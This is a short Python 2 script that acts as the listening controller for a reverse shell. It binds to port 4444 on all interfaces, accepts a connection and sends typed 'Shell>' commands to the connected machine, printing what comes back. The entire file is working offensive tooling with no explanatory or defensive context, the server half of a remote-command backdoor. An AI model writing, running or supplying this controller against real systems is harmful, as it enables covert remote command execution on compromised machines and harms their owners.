import socket 



def connect():

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 

    s.bind(("0.0.0.0", 4444)) 

    s.listen(1) 

    print '[+] Listening for incoming TCP connection on port 4444'

    conn, addr = s.accept() 

    print '[+] We got a connection from: ', addr


    while True:

        command = raw_input("Shell> ") 

        if 'terminate' in command:
            conn.send('terminate')
            conn.close()
            break

        else:
            conn.send(command) 
            print conn.recv(1024) 

def main ():
    connect()
main()
